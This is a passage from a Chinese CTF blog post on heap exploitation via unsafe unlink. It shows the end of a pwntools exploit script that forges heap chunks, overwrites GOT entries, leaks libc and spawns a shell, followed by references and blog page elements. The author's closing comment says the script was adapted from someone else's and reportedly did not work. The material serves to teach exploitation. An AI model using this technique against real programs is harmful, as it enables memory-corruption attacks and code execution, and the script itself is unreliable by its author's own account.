class="params">value</span>):</span><br><span class="line">	io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	io.sendline(<span class="built_in">str</span>(value))</span><br><span class="line">	io.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">	io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	io.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">	io.sendline(content)</span><br><span class="line">	io.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free_chunk</span>(<span class="params">idx</span>):</span><br><span class="line">	io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x602140</span> + <span class="number">0x10</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">malloc_chunk(<span class="number">0x100</span>)</span><br><span class="line">malloc_chunk(<span class="number">0x30</span>)</span><br><span class="line">malloc_chunk(<span class="number">0x80</span>)</span><br><span class="line">raw_input(<span class="string">&quot;after malloc three chunks......&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>)</span><br><span class="line">payload1 += p64(fd) + p64(bk)</span><br><span class="line">payload1 += <span class="string">&quot;a&quot;</span> * <span class="number">0x10</span></span><br><span class="line">payload1 += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, payload1)</span><br><span class="line">raw_input(<span class="string">&quot;after edit chunk2...&quot;</span>)</span><br><span class="line"></span><br><span class="line">free_chunk(<span class="number">3</span>)</span><br><span class="line">raw_input(<span class="string">&quot;after free chunk3...&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;OK\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&quot;free&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&quot;atoi&quot;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">payload2 += p64(free_got) + p64(puts_got) + p64(atoi_got)</span><br><span class="line">edit(<span class="number">2</span>, payload2)</span><br><span class="line">raw_input(<span class="string">&quot;after edit global...&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload3 = p64(puts_plt)</span><br><span class="line">edit(<span class="number">0</span>,payload3)</span><br><span class="line">raw_input(<span class="string">&quot;after edit chunk0...&quot;</span>)</span><br><span class="line"></span><br><span class="line">free_chunk(<span class="number">1</span>)</span><br><span class="line">raw_input(<span class="string">&quot;after free chunk1...&quot;</span>)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">8</span>:].ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;puts addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">puts_offset = libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_offset = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.success(<span class="string">&#x27;/bin/sh addr: &#x27;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">log.success(<span class="string">&#x27;system addr: &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"> </span><br><span class="line">payload4 = p64(system_addr)</span><br><span class="line">edit(<span class="number">2</span>,payload4)</span><br><span class="line">raw_input(<span class="string">&quot;after edit chunk2...&quot;</span>)</span><br><span class="line"> </span><br><span class="line">io.send(p64(binsh_addr))</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#改的别人的EXP，打不通就离谱，爬了</span></span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/#_2">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/#_2</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/108481889">https://blog.csdn.net/qq_41202237/article/details/108481889</a></p>
</li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://ha1loh.github.io">HalloH</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://ha1loh.github.io/article/6fb0.html">https://ha1loh.github.io/article/6fb0.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ha1loh.github.io" target="_blank">HalloH's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a></div><div class="post_share"><div class="social-share" data-image="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221045523.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/article/68d0.html" title="博客搭建"><img class="cover" src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221045661.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">博客搭建</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/article/4622.html" title="Canary保护绕过"><img class="cover" src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221046927.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-07</div><div class="title">Canary保护绕过</div></div></a></div><div><a href="/article/2066.html" title="Heap Exploitation-Off by one"><img class="cover" src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221046780.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-12</div><div class="title">Heap Exploitation-Off by one</div></div></a></div><div><a href="/article/b53c.html" title="Heap Exploitation-tcache"><img class="cover" src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221045731.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-18</div><div class="title">Heap Exploitation-tcache</div></div></a></div><div><a href="/article/ea72.html" title="Heap Exploitation-内存的分配"><img class="cover" src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221046927.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-30</div><div class="title">Heap Exploitation-内存的分配</div></div></a></div><div><a href="/article/673a.html" title="Heap Exploitation-内存管理概述"><img class="cover" src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221045731.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-18</div><div class="title">Heap Exploitation-内存管理概述</div></div></a></div><div><a href="/article/2809.html" title="Heap Exploitation-基础知识"><img class="cover" src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221045661.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-16</div><div class="title">Heap Exploitation-基础知识</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Heap-Exploitation-unsafe-unlink"><span class="toc-number">1.</span> <span class="toc-text">Heap Exploitation - unsafe unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E6%9C%BA%E5%88%B6"><span class="toc-number">1.2.1.</span> <span class="toc-text">检查机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.2.2.</span> <span class="toc-text">条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.3.</span> <span class="toc-text">思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">示例复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">静态分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">1.3.0.2.</span> <span class="toc-text">动态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1"><span class="toc-number">1.3.0.2.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2"><span class="toc-number">1.3.0.2.2.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3"><span class="toc-number">1.3.0.2.3.</span> <span class="toc-text">3</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4"><span class="toc-number">1.3.0.2.4.</span> <span class="toc-text">4</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5"><span class="toc-number">1.3.0.2.5.</span> <span class="toc-text">5</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">1.3.0.3.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.4.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2023 By HalloH</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>